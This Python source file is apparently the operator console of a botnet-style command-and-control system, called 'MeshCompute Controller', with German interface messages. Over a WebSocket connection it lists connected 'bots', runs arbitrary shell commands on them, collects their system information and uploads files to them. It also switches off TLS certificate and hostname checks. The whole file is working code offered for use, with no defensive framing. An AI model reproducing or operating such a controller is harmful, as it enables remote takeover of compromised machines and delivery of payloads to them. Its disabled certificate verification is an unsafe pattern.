import asyncio
import json
import os
import base64
import ssl
import websockets
from colorama import init, Fore, Style
from dotenv import load_dotenv

init(autoreset=True)

load_dotenv()

# configuration from .env
SERVER_URL = os.getenv("SERVER_URL")
AUTH_TOKEN = os.getenv("AUTH_TOKEN")

if not SERVER_URL or not AUTH_TOKEN:
    print(f"{Fore.RED}[-] Fehler: SERVER_URL oder AUTH_TOKEN fehlt in .env{Style.RESET_ALL}")
    exit(1)



INTRO = f"""{Fore.CYAN}
=====================================
MeshCompute Controller (Python)
=====================================
Befehle:
  list | exec <bot_id> <cmd> | sysinfo <bot_id>
  upload <bot_id> <datei>   | exit
====================================={Style.RESET_ALL}"""

PROMPT = f"{Fore.GREEN}meshctrl > {Style.RESET_ALL}"


class MeshController:
    def __init__(self):
        self.ws = None
        self.connected = False
        self.message_queue = asyncio.Queue()
        self.listener_task = None

    async def connect(self):
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        # TLS 1.2 erzwingen (der C++-Server nutzt das)
        ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
        ssl_context.maximum_version = ssl.TLSVersion.TLSv1_2

        try:
            self.ws = await websockets.connect(
                SERVER_URL,
                ssl=ssl_context,
                ping_interval=20,
                ping_timeout=40,
                close_timeout=5
            )
            # Authentifizierung
            await self.ws.send(json.dumps({
                "type": "auth",
                "role": "controller",
                "token": AUTH_TOKEN
            }))
            resp = await asyncio.wait_for(self.ws.recv(), timeout=10)
            data = json.loads(resp)
            if data.get("type") != "auth_ok":
                raise Exception("Authentifizierung fehlgeschlagen: " + resp)
            print(f"{Fore.GREEN}[+] Verbunden & authentifiziert{Style.RESET_ALL}")
            self.connected = True
            self.listener_task = asyncio.create_task(self._listen())
        except Exception as e:
            print(f"{Fore.RED}[-] Verbindung fehlgeschlagen: {e}{Style.RESET_ALL}")
            self.connected = False

    async def disconnect(self):
        self.connected = False
        if self.listener_task:
            self.listener_task.cancel()
        if self.ws:
            await self.ws.close()

    async def _listen(self):
        try:
            while self.connected:
                raw = await self.ws.recv()
                await self.message_queue.put(raw)
        except asyncio.CancelledError:
            pass
        except websockets.exceptions.ConnectionClosed:
            self.connected = False
        except Exception:
            self.connected = False

    async def _wait_for_message(self, expected_type=None, timeout=15):
        try:
            while True:
                raw = await asyncio.wait_for(self.message_queue.get(), timeout=timeout)
                try:
                    data = json.loads(raw)
                except json.JSONDecodeError:
                    continue
                if expected_type is None:
                    return data
                if data.get("type") == expected_type:
                    return data
                # Bot responses are nested
                if data.get("type") == "bot_response":
                    payload = data.get("payload", {})
                    if payload.get("type") == expected_type:
                        return payload
        except asyncio.TimeoutError:
            return None

    # ---- commands ----
    async def cmd_list(self):
        await self.ws.send(json.dumps({"type": "list"}))
        resp = await self._wait_for_message("list_response")
        if resp and "bots" in resp:
            print(f"{Fore.CYAN}Verbundene Bots: {resp['bots']}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Keine Antwort.{Style.RESET_ALL}")

    async def cmd_exec(self, bot_id, command):
        await self.ws.send(json.dumps({
            "type": "exec",
            "target": bot_id,
            "command": command
        }))
        resp = await self._wait_for_message("exec_result")
        if resp and "output" in resp:
            print(f"{Fore.YELLOW}=== Ausgabe {bot_id} ==={Style.RESET_ALL}")
            print(resp["output"].strip())
        else:
            print(f"{Fore.RED}Keine Ausgabe.{Style.RESET_ALL}")

    async def cmd_sysinfo(self, bot_id):
        await self.ws.send(json.dumps({
            "type": "sysinfo",
            "target": bot_id
        }))
        resp = await self._wait_for_message("sysinfo_result")
        if resp and "info" in resp:
            try:
                info = json.loads(resp["info"]) if isinstance(resp["info"], str) else resp["info"]
                print(f"{Fore.YELLOW}=== Systeminfo {bot_id} ==={Style.RESET_ALL}")
                for k, v in info.items():
                    print(f"  {k}: {v}")
            except:
                print(resp)
        else:
            print(f"{Fore.RED}Keine Sysinfo.{Style.RESET_ALL}")

    async def cmd_upload(self, bot_id, filepath):
        if not os.path.exists(filepath):
            print(f"{Fore.RED}Datei nicht gefunden.{Style.RESET_ALL}")
            return
        filename = os.path.basename(filepath)
        with open(filepath, "rb") as f:
            b64 = base64.b64encode(f.read()).decode("utf-8")
        await self.ws.send(json.dumps({
            "type": "upload",
            "target": bot_id,
            "filename": filename,
            "data": b64
        }))
        resp = await self._wait_for_message("upload_result")
        if resp and resp.get("status") == "ok":
            print(f"{Fore.GREEN}Upload erfolgreich.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Upload fehlgeschlagen.{Style.RESET_ALL}")


async def main():
    print(INTRO)
    ctrl = MeshController()
    await ctrl.connect()
    if not ctrl.connected:
        return
    try:
        while True:
            line = input(PROMPT).strip()
            if not line:
                continue
            parts = line.split()
            cmd = parts[0].lower()
            if cmd == "list":
                await ctrl.cmd_list()
            elif cmd == "exec":
                if len(parts) >= 3:
                    await ctrl.cmd_exec(parts[1], " ".join(parts[2:]))
                else:
                    print("exec <bot_id> <command>")
            elif cmd == "sysinfo":
                if len(parts) >= 2:
                    await ctrl.cmd_sysinfo(parts[1])
                else:
                    print("sysinfo <bot_id>")
            elif cmd == "upload":
                if len(parts) >= 3:
                    await ctrl.cmd_upload(parts[1], parts[2])
                else:
                    print("upload <bot_id> <datei>")
            elif cmd in ("exit", "quit"):
                print("Beende...")
                await ctrl.disconnect()
                break
            elif cmd == "help":
                print(INTRO)
            else:
                print(f"{Fore.RED}Unbekannter Befehl. 'help' für Hilfe.{Style.RESET_ALL}")
    except (KeyboardInterrupt, SystemExit):
        await ctrl.disconnect()


if __name__ == "__main__":
    asyncio.run(main())